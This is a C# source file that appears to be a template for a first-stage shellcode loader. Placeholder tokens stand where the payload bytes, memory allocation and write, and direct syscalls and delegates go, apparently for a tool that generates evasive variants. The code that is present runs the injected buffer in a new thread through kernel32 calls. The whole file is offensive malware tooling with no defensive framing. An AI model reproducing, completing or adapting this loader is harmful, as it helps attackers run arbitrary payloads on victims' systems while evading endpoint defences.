using System;
using System.Runtime.InteropServices;

namespace Stage1
{
    class Program
    {
        static void Main()
        {
            byte[] payload = new byte[] { [SHAPESHIFTER_SHELLCODE] };

            IntPtr hCurrentProcess = PInvokes.GetCurrentProcess();


            Console.WriteLine("Allocating memory...");
            [SHAPESHIFTER_MEMALLOC]

            Console.WriteLine("Writing to the buffer (0x{0:X} bytes)", payload.Length);
            [SHAPESHIFTER_WRITEVM]

            Console.WriteLine("Creating thread...");
            uint threadID = 0;
            IntPtr hThread = PInvokes.CreateThread(0, 0, (uint)pMemoryAllocation, IntPtr.Zero, 0, ref threadID);
            if (hThread == IntPtr.Zero)
            {
                return;
            }
            else
            {
                Console.WriteLine("[+] Thread ID: 0x{0:X}", threadID);
            }

            Console.WriteLine("Waiting for the thread to start...");
            PInvokes.WaitForSingleObject(hThread, 0xFFFFFFFF);

            Console.WriteLine("Operation complete");
            return;
        }
    }

    class PInvokes
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, uint lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [SHAPESHIFTER_PINVOKES]
    }

    class Syscalls
    {
        [SHAPESHIFTER_SYSCALLS]

        public struct Delegates
        {
            [SHAPESHIFTER_DELEGATES]
        }
    }
}